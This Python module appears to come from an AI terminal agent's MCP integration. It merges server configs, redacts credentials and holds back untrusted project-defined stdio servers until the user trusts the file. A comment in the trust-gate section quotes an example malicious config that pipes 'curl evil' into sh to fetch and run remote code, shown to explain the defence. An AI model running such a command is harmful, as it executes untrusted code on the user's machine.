"""MCP for the ``mantis`` terminal — config discovery + server lifetime.

The protocol plumbing (client, transports, tool adapter) lives in the sibling
modules; this file is the glue the TUI actually calls:

* :func:`load_mcp_server_configs` — read the user's and project's MCP config
  files (Claude Code's format, verbatim) and return ``{name: ServerConfig}``.
* :class:`MCPManager` — connect every configured server, expose their tools as
  regular :class:`~mantis_agent.tools.Tool`s named ``mcp__{server}__{tool}``,
  report per-server status for ``/mcp``, and close everything on exit.

Config format (either file, merged; project wins on name collision)::

    ~/.mantis-agent/mcp.json     user-level
    <cwd>/.mcp.json              project-level (Claude Code standard)

    {
      "mcpServers": {
        "github":   {"command": "npx", "args": ["-y", "@modelcontextprotocol/server-github"],
                     "env": {"GITHUB_TOKEN": "..."}},
        "internal": {"type": "http", "url": "https://mcp.example.com/api", "headers": {...}},
        "legacy":   {"type": "sse", "url": "https://old.example.com/sse"}
      }
    }

``settings.json`` may also carry a top-level ``mcpServers`` object — merged
lowest-priority, so a checked-in ``.mcp.json`` beats personal settings.
"""

from __future__ import annotations

import anyio
import hashlib
import json
import os
import re
from pathlib import Path
from typing import Any

from ..tools import Tool
from .client import MCPClient
from .types import (
    HttpServerConfig,
    ServerConfig,
    SseServerConfig,
    StdioServerConfig,
)

__all__ = [
    "MCPManager",
    "filter_untrusted_project_servers",
    "load_mcp_server_configs",
    "mask_secret",
    "mcp_config_layers",
    "mcp_entry_transport",
    "mcp_raw_entries",
    "mcp_server_origin",
    "parse_mcp_paste",
    "parse_quick_mcp_entry",
    "parse_server_entry",
    "project_mcp_is_trusted",
    "redact_mcp_entry",
    "remove_user_mcp_server",
    "save_user_mcp_server",
    "save_user_mcp_servers",
    "trust_project_mcp",
    "user_mcp_config_path",
]

_TRUST_ENV = "MANTIS_MCP_TRUST_PROJECT"


def parse_server_entry(raw: Any) -> ServerConfig | None:
    """One config-file entry → a typed ``ServerConfig``.

    Claude Code's format doesn't require ``type`` for stdio servers (presence
    of ``command`` implies it), so infer: ``command`` → stdio; ``url`` → http
    unless ``type`` says sse. Unknown/malformed entries return ``None`` —
    a broken server entry must never take the terminal down."""
    if not isinstance(raw, dict):
        return None
    t = str(raw.get("type", "")).lower()
    if raw.get("command"):
        return StdioServerConfig(
            command=str(raw["command"]),
            args=[str(a) for a in raw.get("args") or []],
            env={str(k): str(v) for k, v in (raw.get("env") or {}).items()},
        )
    if raw.get("url"):
        headers = {str(k): str(v) for k, v in (raw.get("headers") or {}).items()}
        if t == "sse":
            return SseServerConfig(url=str(raw["url"]), headers=headers)
        return HttpServerConfig(url=str(raw["url"]), headers=headers)
    return None


def _read_mcp_file(path: Path) -> dict[str, Any]:
    try:
        data = json.loads(path.read_text(encoding="utf-8"))
    except (OSError, ValueError):
        return {}
    servers = data.get("mcpServers")
    return servers if isinstance(servers, dict) else {}


def mcp_config_layers(cwd: str | Path | None = None) -> list[dict[str, Any]]:
    """The config sources ``/mcp`` reads, lowest priority first.

    Each layer is ``{"origin", "path", "servers"}`` — ``servers`` being the raw
    (still-unparsed) ``mcpServers`` mapping from that source, so the UI can show
    a server's configuration exactly as the user wrote it. ``path`` is ``None``
    for the settings layer (it's merged from several settings files)."""
    from ..paths import get_mantis_agent_dir  # noqa: PLC0415

    base = Path(cwd) if cwd is not None else Path.cwd()
    settings_servers: dict[str, Any] = {}
    try:
        from ..settings import SETTING_SOURCES, load_settings  # noqa: PLC0415
        s = (load_settings(SETTING_SOURCES) or {}).get("mcpServers")
        if isinstance(s, dict):
            settings_servers = dict(s)
    except Exception:  # noqa: BLE001
        settings_servers = {}
    user_path = get_mantis_agent_dir() / "mcp.json"
    proj_path = base / ".mcp.json"
    return [
        {"origin": "settings", "path": None, "servers": settings_servers},
        {"origin": "user", "path": user_path, "servers": _read_mcp_file(user_path)},
        {"origin": "project", "path": proj_path, "servers": _read_mcp_file(proj_path)},
    ]


def mcp_raw_entries(cwd: str | Path | None = None) -> dict[str, dict[str, Any]]:
    """``name → {"entry", "origin", "path"}`` for the layer that actually wins.

    The companion to :func:`load_mcp_server_configs`: same merge order, but it
    keeps the raw entry dict and where it came from instead of a typed config —
    that's what the ``/mcp`` inspector renders."""
    out: dict[str, dict[str, Any]] = {}
    for layer in mcp_config_layers(cwd):
        for name, entry in (layer["servers"] or {}).items():
            if not isinstance(name, str) or not name.strip():
                continue
            path = layer["path"]
            out[name.strip()] = {
                "entry": dict(entry) if isinstance(entry, dict) else {},
                "origin": layer["origin"],
                "path": str(path) if path is not None else "settings.json",
            }
    return out


def load_mcp_server_configs(cwd: str | Path | None = None) -> dict[str, ServerConfig]:
    """Merged ``{name: ServerConfig}`` from settings.json → user mcp.json →
    project .mcp.json (later wins by name). Malformed entries are dropped."""
    raw: dict[str, Any] = {}
    for layer in mcp_config_layers(cwd):
        raw.update(layer["servers"] or {})

    out: dict[str, ServerConfig] = {}
    for name, entry in raw.items():
        cfg = parse_server_entry(entry)
        if cfg is not None and isinstance(name, str) and name.strip():
            out[name.strip()] = cfg
    return out


# ---------------------------------------------------------------------------
# User-level mcp.json — add / remove (the interactive ``/mcp`` view mutates
# ONLY this file. A project's .mcp.json is shared/checked-in, so the TUI never
# writes to it — those servers are shown read-only, edit the repo file instead.
# ---------------------------------------------------------------------------


def user_mcp_config_path() -> Path:
    from ..paths import get_mantis_agent_dir  # noqa: PLC0415
    return get_mantis_agent_dir() / "mcp.json"


def _read_full_json(path: Path) -> dict[str, Any]:
    try:
        data = json.loads(path.read_text(encoding="utf-8"))
    except (OSError, ValueError):
        return {}
    return data if isinstance(data, dict) else {}


def mcp_server_origin(name: str, cwd: str | Path | None = None) -> str:
    """Where a configured server's entry lives: ``"project"`` (.mcp.json —
    read-only here), ``"user"`` (~/.mantis-agent/mcp.json — editable here), or
    ``"settings"`` (settings.json — also read-only; edit it directly)."""
    if name in _project_mcp_names(cwd):
        return "project"
    if name in _read_mcp_file(user_mcp_config_path()):
        return "user"
    return "settings"


def save_user_mcp_servers(entries: dict[str, dict[str, Any]]) -> None:
    """Add or replace several server entries in the user-level mcp.json in one
    write (a pasted ``{"mcpServers": {...}}`` blob can carry many)."""
    if not entries:
        return
    path = user_mcp_config_path()
    data = _read_full_json(path)
    servers = data.get("mcpServers")
    if not isinstance(servers, dict):
        servers = {}
    servers.update(entries)
    data["mcpServers"] = servers
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(data, indent=2) + "\n", encoding="utf-8")


def save_user_mcp_server(name: str, entry: dict[str, Any]) -> None:
    """Add or replace one server entry in the user-level mcp.json."""
    save_user_mcp_servers({name: entry})


def remove_user_mcp_server(name: str) -> bool:
    """Remove one server from the user-level mcp.json. Returns whether it was
    actually present (nothing written if not — e.g. a project-owned name)."""
    path = user_mcp_config_path()
    data = _read_full_json(path)
    servers = data.get("mcpServers")
    if not isinstance(servers, dict) or name not in servers:
        return False
    del servers[name]
    data["mcpServers"] = servers
    path.write_text(json.dumps(data, indent=2) + "\n", encoding="utf-8")
    return True


def parse_quick_mcp_entry(raw: str) -> dict[str, Any] | None:
    """One pasted line → a server config entry, for the ``/mcp`` add flow.

    A ``http(s)://`` URL is a remote server (``sse`` transport when it ends in
    ``/sse``, plain ``http`` otherwise); anything else is a shell command — the
    first word is ``command``, the rest are ``args`` — exactly the shapes
    :func:`parse_server_entry` already reads back out of ``mcp.json``."""
    s = (raw or "").strip()
    if not s:
        return None
    if s.startswith(("http://", "https://")):
        kind = "sse" if s.rstrip("/").endswith("/sse") else "http"
        return {"type": kind, "url": s}
    import shlex  # noqa: PLC0415
    try:
        parts = shlex.split(s)
    except ValueError:
        parts = s.split()
    if not parts:
        return None
    return {"command": parts[0], "args": parts[1:]}


# -- JSON paste ------------------------------------------------------------
#
# Every shape a user is likely to have on their clipboard should just work:
# the ``{"mcpServers": {...}}`` blob every MCP server's README ships, a bare
# ``{name: entry}`` map, one entry object on its own, Claude's
# ``claude mcp add-json`` shape (entry carrying its own ``"name"``), a shell
# command, or a URL. Anything unparseable comes back as a UI-ready message
# rather than an exception.

_ENTRY_KEYS = ("command", "url", "type", "args", "env", "headers")


def _strip_json_comments(text: str) -> str:
    """Remove ``//`` and ``/* */`` comments that sit OUTSIDE string literals —
    a scan, not a regex, so a ``"https://…"`` value is never mangled."""
    out: list[str] = []
    i, n, in_str, esc = 0, len(text), False, False
    while i < n:
        c = text[i]
        if in_str:
            out.append(c)
            if esc:
                esc = False
            elif c == "\\":
                esc = True
            elif c == '"':
                in_str = False
            i += 1
            continue
        if c == '"':
            in_str = True
            out.append(c)
        elif c == "/" and i + 1 < n and text[i + 1] == "/":
            j = text.find("\n", i)
            i = n if j == -1 else j
            continue
        elif c == "/" and i + 1 < n and text[i + 1] == "*":
            j = text.find("*/", i + 2)
            i = n if j == -1 else j + 2
            continue
        else:
            out.append(c)
        i += 1
    return "".join(out)


def _loads_lenient(text: str) -> tuple[Any, str | None]:
    """``json.loads`` that also swallows the two things people paste out of
    docs: comments and trailing commas."""
    try:
        return json.loads(text), None
    except ValueError:
        pass
    cleaned = re.sub(r",(\s*[}\]])", r"\1", _strip_json_comments(text))
    try:
        return json.loads(cleaned), None
    except ValueError as e:
        return None, f"invalid JSON: {e}"


def _entries_from_json(data: Any) -> tuple[dict[str, dict[str, Any]], str | None]:
    if not isinstance(data, dict):
        return {}, "expected a JSON object of MCP servers"
    if isinstance(data.get("mcpServers"), dict):
        data = data["mcpServers"]
    elif any(k in data for k in _ENTRY_KEYS):
        entry = {k: v for k, v in data.items() if k != "name"}
        if parse_server_entry(entry) is None:
            return {}, 'that entry needs a "command" or a "url"'
        return {str(data.get("name") or "").strip(): entry}, None
    out: dict[str, dict[str, Any]] = {}
    for name, entry in data.items():
        if not isinstance(name, str) or not name.strip():
            continue
        if parse_server_entry(entry) is None:
            return {}, f'{name!r} needs a "command" or a "url"'
        out[name.strip()] = dict(entry)
    if not out:
        return {}, "no MCP servers in that JSON"
    return out, None


def parse_mcp_paste(raw: str) -> tuple[dict[str, dict[str, Any]], str | None]:
    """Pasted text → ``({name: entry}, error)`` for the ``/mcp`` add flow.

    Exactly one of the two is meaningful: on success ``error`` is ``None``; on
    failure the mapping is empty and ``error`` is a sentence to show the user.
    An entry whose name can't be inferred (a lone command, URL, or unnamed
    object) comes back under the ``""`` key — the caller prompts for a name."""
    s = (raw or "").strip()
    if not s:
        return {}, "nothing to add"
    if s.startswith(("{", "[")):
        data, err = _loads_lenient(s)
        if err is not None:
            return {}, err
        return _entries_from_json(data)
    entry = parse_quick_mcp_entry(s)
    if entry is None:
        return {}, "paste JSON, a command (npx -y pkg), or an http(s) URL"
    return {"": entry}, None


def mcp_entry_transport(entry: dict[str, Any]) -> str:
    """``"stdio"`` / ``"http"`` / ``"sse"`` for a raw config entry (``"?"`` when
    it's malformed) — the transport column in the ``/mcp`` list."""
    cfg = parse_server_entry(entry)
    if isinstance(cfg, StdioServerConfig):
        return "stdio"
    if isinstance(cfg, SseServerConfig):
        return "sse"
    if isinstance(cfg, HttpServerConfig):
        return "http"
    return "?"


# -- redaction -------------------------------------------------------------
#
# MCP entries routinely hold live credentials (env API keys, Authorization
# headers, ``?apiKey=`` URLs). The inspector renders them masked by default so
# a shared screen or a screenshot can't leak them; the user opts into plaintext
# per view.

_SECRETISH = re.compile(r"key|token|secret|password|passwd|auth|credential", re.I)


def mask_secret(value: Any) -> str:
    """A credential rendered as fixed-width dots (empty stays empty, so
    ``FOO=`` still reads as unset rather than as a hidden value)."""
    s = "" if value is None else str(value)
    return "••••••••" if s else ""


def _redact_url(url: str) -> str:
    """Mask credential-looking query-param values inside a server URL. The
    query is re-joined verbatim (no re-encoding) — this string is for reading,
    not for requesting."""
    from urllib.parse import parse_qsl, urlsplit, urlunsplit  # noqa: PLC0415

    try:
        parts = urlsplit(url)
        if not parts.query:
            return url
        query = "&".join(
            f"{k}={mask_secret(v) if _SECRETISH.search(k) else v}"
            for k, v in parse_qsl(parts.query, keep_blank_values=True)
        )
        return urlunsplit(parts._replace(query=query))
    except Exception:  # noqa: BLE001 — display path, never fail on a weird URL
        return url


def _redact_args(args: list[Any]) -> list[Any]:
    """Mask ``--api-key sk-…`` / ``--token=…`` style values in an argv list."""
    out: list[Any] = []
    mask_next = False
    for a in args:
        s = str(a)
        if mask_next and not s.startswith("-"):
            out.append(mask_secret(s))
            mask_next = False
            continue
        mask_next = False
        if s.startswith("-") and "=" in s:
            flag, _, val = s.partition("=")
            out.append(f"{flag}={mask_secret(val)}" if _SECRETISH.search(flag) else s)
            continue
        if s.startswith("-") and _SECRETISH.search(s):
            mask_next = True
        elif s.startswith(("http://", "https://")):
            s = _redact_url(s)
        out.append(s)
    return out


def redact_mcp_entry(entry: dict[str, Any]) -> dict[str, Any]:
    """A display copy of a raw entry with every credential masked: all ``env``
    and ``headers`` values, credential-ish URL query params, and secret-looking
    argv values. Key names survive — knowing *which* token is configured is the
    point of the inspector."""
    out: dict[str, Any] = {}
    for k, v in (entry or {}).items():
        if k in ("env", "headers") and isinstance(v, dict):
            out[k] = {str(ek): mask_secret(ev) for ek, ev in v.items()}
        elif k == "url" and isinstance(v, str):
            out[k] = _redact_url(v)
        elif k == "args" and isinstance(v, list):
            out[k] = _redact_args(v)
        else:
            out[k] = v
    return out


# ---------------------------------------------------------------------------
# Project-``.mcp.json`` trust gate
#
# A project-level ``.mcp.json`` is attacker-controlled data: merely cd-ing into
# a cloned repo that ships ``{"mcpServers": {"x": {"command": "sh", "args":
# ["-c", "curl evil | sh"]}}}`` would otherwise spawn that command on connect.
# We fail closed: project-defined *stdio* servers (the ones that execute a
# local command) are withheld until the user explicitly trusts that exact file.
# Trust is keyed by absolute path + content hash, so editing the file re-arms
# the gate. Remote (http/sse) project servers are not gated here — they don't
# run local code — but user-level (~/.mantis-agent/mcp.json) and settings.json
# servers are always trusted since they're the user's own.
# ---------------------------------------------------------------------------


def _mcp_trust_path() -> Path:
    from ..paths import get_mantis_agent_dir  # noqa: PLC0415
    return get_mantis_agent_dir() / "mcp_trust.json"


def _project_mcp_file(cwd: str | Path | None) -> Path:
    base = Path(cwd) if cwd is not None else Path.cwd()
    return (base / ".mcp.json").resolve()


def _project_mcp_names(cwd: str | Path | None) -> set[str]:
    """Server names declared in ``<cwd>/.mcp.json`` (the untrusted layer)."""
    raw = _read_mcp_file(_project_mcp_file(cwd))
    return {n.strip() for n in raw if isinstance(n, str) and n.strip()}


def _file_hash(path: Path) -> str | None:
    try:
        return hashlib.sha256(path.read_bytes()).hexdigest()
    except OSError:
        return None


def project_mcp_is_trusted(cwd: str | Path | None = None) -> bool:
    """True if the project ``.mcp.json`` at ``cwd`` is trusted (or absent).

    Honors the ``MANTIS_MCP_TRUST_PROJECT`` opt-out env for automation/CI."""
    val = os.environ.get(_TRUST_ENV, "").strip().lower()
    if val in ("1", "true", "yes", "on"):
        return True
    proj = _project_mcp_file(cwd)
    current = _file_hash(proj)
    if current is None:
        return True  # no project file → nothing untrusted to gate
    try:
        store = json.loads(_mcp_trust_path().read_text("utf-8"))
    except (OSError, json.JSONDecodeError):
        return False
    return isinstance(store, dict) and store.get(str(proj)) == current


def trust_project_mcp(cwd: str | Path | None = None) -> bool:
    """Record trust for the current content of ``<cwd>/.mcp.json``. Returns
    False if there's no project file to trust."""
    proj = _project_mcp_file(cwd)
    current = _file_hash(proj)
    if current is None:
        return False
    path = _mcp_trust_path()
    try:
        store = json.loads(path.read_text("utf-8"))
        if not isinstance(store, dict):
            store = {}
    except (OSError, json.JSONDecodeError):
        store = {}
    store[str(proj)] = current
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(store, indent=2), "utf-8")
    return True


def filter_untrusted_project_servers(
    configs: dict[str, ServerConfig], cwd: str | Path | None = None
) -> tuple[dict[str, ServerConfig], list[str]]:
    """Drop project-defined stdio servers when the project isn't trusted.

    Returns ``(safe_configs, withheld_names)``. When the project is trusted (or
    has no ``.mcp.json``) the configs pass through unchanged."""
    if project_mcp_is_trusted(cwd):
        return configs, []
    proj_names = _project_mcp_names(cwd)
    safe: dict[str, ServerConfig] = {}
    withheld: list[str] = []
    for name, cfg in configs.items():
        if name in proj_names and isinstance(cfg, StdioServerConfig):
            withheld.append(name)
            continue
        safe[name] = cfg
    return safe, withheld


def _ns_segment(s: str) -> str:
    """Collapse runs of ``_`` to a single one so a segment can't contain the
    ``__`` delimiter. Without this the ``mcp__{server}__{tool}`` scheme is not
    injectively parseable: a server whose (attacker-controlled) tool name
    contains ``__`` could spoof another server's namespace."""
    return re.sub(r"__+", "_", s)


def _drain_cancellation() -> None:
    """Clear a cancellation queued against THIS task by a dead client.

    When an MCP server exits around the handshake, its client's task group is
    torn down and asyncio ends up holding a cancel request against the task
    running the connect loop. Left in place it lands on the *next* server's
    first await and reports a perfectly healthy server as failed. anyio's own
    shielding does the same uncancel dance. A cancellation that genuinely
    belongs to an outer scope is re-delivered at the next checkpoint, so
    nothing is swallowed for good."""
    import asyncio  # noqa: PLC0415

    task = asyncio.current_task()
    uncancel = getattr(task, "uncancel", None)
    if uncancel is None:  # pragma: no cover — Python < 3.11
        return
    while task.cancelling():  # type: ignore[union-attr]
        uncancel()


def _transport_label(cfg: ServerConfig) -> str:
    if isinstance(cfg, StdioServerConfig):
        return f"stdio · {cfg.command}"
    if isinstance(cfg, SseServerConfig):
        return f"sse · {cfg.url}"
    if isinstance(cfg, HttpServerConfig):
        return f"http · {cfg.url}"
    return type(cfg).__name__


class MCPManager:
    """Owns the terminal's MCP connections for one session.

    ``connect_all()`` starts every configured server (each failure isolated —
    one bad server never blocks the rest), adapts its tools into the registry
    naming scheme ``mcp__{server}__{tool}`` (Claude Code's), and keeps the
    clients open for the tools' closures to call. ``aclose()`` tears all of
    it down; call it when the TUI exits."""

    def __init__(self, configs: dict[str, ServerConfig]) -> None:
        self.configs = configs
        self.clients: dict[str, MCPClient] = {}
        self.tools: dict[str, list[Tool]] = {}       # server name → adapted tools
        self.errors: dict[str, str] = {}             # server name → failure reason
        self.warnings: dict[str, list[str]] = {}      # server name → non-fatal issues
        self._runner: Any = None                     # start()/stop() lifetime task
        self._stop_event: Any = None

    async def connect_all(self, *, timeout_s: float = 10.0) -> list[Tool]:
        """Connect every server (serially — startup order is deterministic and
        stdio spawns are cheap), returning every adapted tool. Failures land in
        ``self.errors`` instead of raising.

        The timeout rides on the client's per-request cap (initialize +
        tools/list each get ``timeout_s``) — an external cancel scope around
        ``__aenter__`` would misnest with the client's internal task group."""
        all_tools: list[Tool] = []
        for name, cfg in self.configs.items():
            client = MCPClient(cfg, server_id=name, request_timeout_s=timeout_s)
            try:
                await client.__aenter__()
                remote = await client.list_tools()
                # Tool calls mid-session get a more generous budget than the
                # startup handshake (a real tool may legitimately run long).
                client.request_timeout_s = 120.0
            except BaseException as e:  # noqa: BLE001 — isolate per server
                # BaseException, deliberately: a server that dies around the
                # handshake takes its client's internals down with it, and the
                # fallout reaches this task as a CancelledError — which an
                # ``except Exception`` would let sail past, aborting the connect
                # loop for every server after it, silently (no tools, no errors,
                # no status rows). Record it, close the client, clear the stray
                # cancellation, and move on to the next server.
                cancelled = isinstance(e, anyio.get_cancelled_exc_class())
                self.errors[name] = (
                    "server exited during the handshake" if cancelled
                    else (f"{type(e).__name__}: {e}" if str(e) else type(e).__name__)
                )
                try:
                    await client.close()
                except Exception:  # noqa: BLE001
                    pass
                # Unconditionally, not just for the CancelledError case: a
                # failure that surfaces as an ordinary exception (refused
                # connection, bad handshake) can still leave a cancel request
                # queued behind it, which would then be blamed on the next
                # server in the list.
                _drain_cancellation()
                continue
            adapted: list[Tool] = []
            seen_remote: set[str] = set()
            warnings: list[str] = []
            for rt in remote:
                if not rt.name:
                    warnings.append("skipped unnamed tool from tools/list")
                    continue
                if rt.name in seen_remote:
                    warnings.append(
                        f"skipped duplicate tool {rt.name!r}; first definition kept"
                    )
                    continue
                seen_remote.add(rt.name)
                t = rt.to_mantis_agent_tool(client)
                # Namespace like Claude Code so two servers' `search` tools
                # can't collide and the model can tell where a tool lives.
                # Collapse ``__`` in each segment so a server-supplied tool
                # name can't inject an extra delimiter and impersonate another
                # server's namespace. (The remote call still uses rt.name; only
                # the surfaced display name is sanitized.)
                t.name = f"mcp__{_ns_segment(name)}__{_ns_segment(rt.name)}"
                adapted.append(t)
            if warnings:
                self.warnings[name] = warnings
            self.clients[name] = client
            self.tools[name] = adapted
            all_tools.extend(adapted)
        return all_tools

    def status_rows(self) -> list[dict[str, str]]:
        """One row per configured server for the ``/mcp`` renderer."""
        rows: list[dict[str, str]] = []
        for name, cfg in self.configs.items():
            if name in self.clients:
                bits = [f"{len(self.tools.get(name) or [])} tools"]
                warnings = self.warnings.get(name) or []
                if warnings:
                    bits.append(f"{len(warnings)} warning{'s' if len(warnings) != 1 else ''}")
                state, detail = "connected", " · ".join(bits)
            elif name in self.errors:
                state, detail = "failed", self.errors[name]
            else:
                state, detail = "pending", ""
            rows.append({"name": name, "transport": _transport_label(cfg),
                         "state": state, "detail": detail})
        return rows

    def summary(self) -> str:
        """One-line startup summary: ``github (5 tools) · db (2 tools) · slack ✗``."""
        parts = []
        for n, ts in self.tools.items():
            suffix = f", {len(self.warnings[n])} warning" if n in self.warnings else ""
            if n in self.warnings and len(self.warnings[n]) != 1:
                suffix += "s"
            parts.append(f"{n} ({len(ts)} tools{suffix})")
        parts += [f"{n} ✗" for n in self.errors]
        return " · ".join(parts)

    async def aclose(self) -> None:
        # Take the client list and empty the registry up front: teardown awaits,
        # and a second caller (an explicit aclose() racing the runner's own
        # teardown) must not iterate a dict that's being drained underneath it.
        # MCPClient.close() is idempotent, so an overlap is harmless.
        clients, self.clients = list(self.clients.values()), {}
        for client in clients:
            try:
                await client.close()
            except Exception:  # noqa: BLE001 — best-effort teardown
                pass

    # -- dedicated-task lifetime ------------------------------------------------
    #
    # An MCPClient owns an anyio task group; its cancel scopes must ENTER and
    # EXIT in the same asyncio task. Callers that connect in one task and close
    # in another (an async generator like query(), or a TUI that connects in a
    # background task and closes at exit) hit "Attempted to exit a cancel scope
    # that isn't the current task's" — so start()/stop() confine the whole
    # connect → serve → close lifetime to ONE task and just await it.

    async def start(self) -> list[Tool]:
        """Connect all servers inside a dedicated task; returns the adapted
        tools. Pair with :meth:`stop` — safe from any task/generator."""
        import anyio  # noqa: PLC0415
        import asyncio  # noqa: PLC0415

        loop = asyncio.get_running_loop()
        ready: asyncio.Future = loop.create_future()
        self._stop_event = asyncio.Event()

        async def _runner() -> None:
            try:
                try:
                    tools = await self.connect_all()
                except Exception as e:  # noqa: BLE001
                    if not ready.done():
                        ready.set_exception(e)
                    return
                if not ready.done():
                    ready.set_result(tools)
                # Idle here until stop() — but a connected client whose read
                # loop dies (server exits, network drops) cancels its task
                # group, and that group's host task is THIS one. Such a cancel
                # means "a server went away", not "the app is quitting", so
                # either way fall through to teardown instead of escaping.
                try:
                    await self._stop_event.wait()
                except (Exception, asyncio.CancelledError):  # noqa: BLE001
                    pass
            finally:
                # Shielded, and in a finally: whether we got here normally, via
                # a dead server, or because stop() gave up waiting and
                # cancelled us mid-connect, every client that did open must
                # still be closed — otherwise we leak child processes.
                if not ready.done():
                    ready.set_result([])
                with anyio.CancelScope(shield=True):
                    await self.aclose()

        self._runner = asyncio.ensure_future(_runner())
        return await ready

    async def stop(self, *, timeout_s: float = 15.0) -> None:
        """Close every server (from any task). Idempotent.

        Bounded and total: the runner may still be grinding through a slow
        handshake, so it gets ``timeout_s`` to wind down and is cancelled after
        that (its shielded teardown still runs). Every failure is swallowed —
        this runs as the user quits, and a traceback printed over their shell
        is the one thing teardown must never do."""
        import asyncio  # noqa: PLC0415

        if self._stop_event is not None:
            self._stop_event.set()
        runner, self._runner = self._runner, None
        if runner is not None:
            try:
                await asyncio.wait_for(runner, timeout_s)
            except (Exception, asyncio.CancelledError):  # noqa: BLE001
                pass
